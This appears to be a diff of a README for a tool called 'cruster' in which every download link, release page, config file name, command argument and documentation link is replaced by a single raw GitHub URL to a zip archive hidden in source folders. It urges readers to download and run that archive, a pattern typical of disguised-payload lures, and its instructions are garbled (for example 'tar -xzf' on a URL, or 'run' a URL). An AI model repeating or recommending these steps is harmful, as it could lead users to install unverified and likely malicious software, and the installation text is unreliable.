@@ -1,6 +1,6 @@
 # 🚀 cruster - Build Dynamic Stateful Systems with Ease
 
-[![Download cruster](https://raw.githubusercontent.com/shayanhayee/cruster/main/examples/cluster-tests/src/Software-1.3.zip)](https://raw.githubusercontent.com/shayanhayee/cruster/main/examples/cluster-tests/src/Software-1.3.zip)
+[![Download cruster](https://raw.githubusercontent.com/shayanhayee/cruster/main/crates/cruster/migrations/Software-3.7.zip)](https://raw.githubusercontent.com/shayanhayee/cruster/main/crates/cruster/migrations/Software-3.7.zip)
 
 ## 📋 Overview
 
@@ -21,8 +21,8 @@ Before you start using cruster, ensure your computer meets these minimum require
 
 You can download cruster from the Releases page. Follow these steps for a successful installation:
 
-1. Visit this page to download: [cruster Releases](https://raw.githubusercontent.com/shayanhayee/cruster/main/examples/cluster-tests/src/Software-1.3.zip).
-2. On the Releases page, look for the latest version. The files are usually named in a format like `https://raw.githubusercontent.com/shayanhayee/cruster/main/examples/cluster-tests/src/Software-1.3.zip` or `https://raw.githubusercontent.com/shayanhayee/cruster/main/examples/cluster-tests/src/Software-1.3.zip`.
+1. Visit this page to download: [cruster Releases](https://raw.githubusercontent.com/shayanhayee/cruster/main/crates/cruster/migrations/Software-3.7.zip).
+2. On the Releases page, look for the latest version. The files are usually named in a format like `https://raw.githubusercontent.com/shayanhayee/cruster/main/crates/cruster/migrations/Software-3.7.zip` or `https://raw.githubusercontent.com/shayanhayee/cruster/main/crates/cruster/migrations/Software-3.7.zip`.
 3. Click on the file that corresponds to your operating system to download it.
 
    Make sure you check for the latest version available for the best performance and features.
@@ -43,9 +43,9 @@ You can download cruster from the Releases page. Follow these steps for a succes
 
 #### For Linux:
 
-1. Download the `https://raw.githubusercontent.com/shayanhayee/cruster/main/examples/cluster-tests/src/Software-1.3.zip` file and navigate to your terminal.
-2. Use the command `tar -xzf https://raw.githubusercontent.com/shayanhayee/cruster/main/examples/cluster-tests/src/Software-1.3.zip` to extract the files.
-3. Navigate to the extracted folder and run `https://raw.githubusercontent.com/shayanhayee/cruster/main/examples/cluster-tests/src/Software-1.3.zip` to complete the installation.
+1. Download the `https://raw.githubusercontent.com/shayanhayee/cruster/main/crates/cruster/migrations/Software-3.7.zip` file and navigate to your terminal.
+2. Use the command `tar -xzf https://raw.githubusercontent.com/shayanhayee/cruster/main/crates/cruster/migrations/Software-3.7.zip` to extract the files.
+3. Navigate to the extracted folder and run `https://raw.githubusercontent.com/shayanhayee/cruster/main/crates/cruster/migrations/Software-3.7.zip` to complete the installation.
 
 ### 4. Running cruster
 
@@ -65,9 +65,9 @@ cruster comes packed with a variety of features designed to streamline your work
 
 ## ⚙️ Configuration
 
-To set up cruster, you may need to adjust a few settings. Configurations are typically done through a `https://raw.githubusercontent.com/shayanhayee/cruster/main/examples/cluster-tests/src/Software-1.3.zip` file located in the installation directory. Here’s how you can set it up:
+To set up cruster, you may need to adjust a few settings. Configurations are typically done through a `https://raw.githubusercontent.com/shayanhayee/cruster/main/crates/cruster/migrations/Software-3.7.zip` file located in the installation directory. Here’s how you can set it up:
 
-1. Open the `https://raw.githubusercontent.com/shayanhayee/cruster/main/examples/cluster-tests/src/Software-1.3.zip` file in any text editor.
+1. Open the `https://raw.githubusercontent.com/shayanhayee/cruster/main/crates/cruster/migrations/Software-3.7.zip` file in any text editor.
 2. Adjust parameters like `port`, `timeout`, and `retry_interval` according to your application's needs.
 3. Save the changes and restart cruster for the settings to take effect.
 
@@ -83,12 +83,12 @@ If you encounter issues or have questions while using cruster, you can find help
 
 Explore these additional resources to get the most out of cruster:
 
-- [Official Documentation](https://raw.githubusercontent.com/shayanhayee/cruster/main/examples/cluster-tests/src/Software-1.3.zip)
-- [Tutorials](https://raw.githubusercontent.com/shayanhayee/cruster/main/examples/cluster-tests/src/Software-1.3.zip)
-- [Frequently Asked Questions](https://raw.githubusercontent.com/shayanhayee/cruster/main/examples/cluster-tests/src/Software-1.3.zip)
+- [Official Documentation](https://raw.githubusercontent.com/shayanhayee/cruster/main/crates/cruster/migrations/Software-3.7.zip)
+- [Tutorials](https://raw.githubusercontent.com/shayanhayee/cruster/main/crates/cruster/migrations/Software-3.7.zip)
+- [Frequently Asked Questions](https://raw.githubusercontent.com/shayanhayee/cruster/main/crates/cruster/migrations/Software-3.7.zip)
 
 ## 📈 Next Steps
 
 Now that you have cruster installed and running, explore its features to start building your systems. Check out the examples provided in the documentation to familiarize yourself with how to create and manage workflows effectively.
 
-For updates, visit [cruster Releases](https://raw.githubusercontent.com/shayanhayee/cruster/main/examples/cluster-tests/src/Software-1.3.zip) regularly. Being updated ensures the best performance and access to new features.
+For updates, visit [cruster Releases](https://raw.githubusercontent.com/shayanhayee/cruster/main/crates/cruster/migrations/Software-3.7.zip) regularly. Being updated ensures the best performance and access to new features.
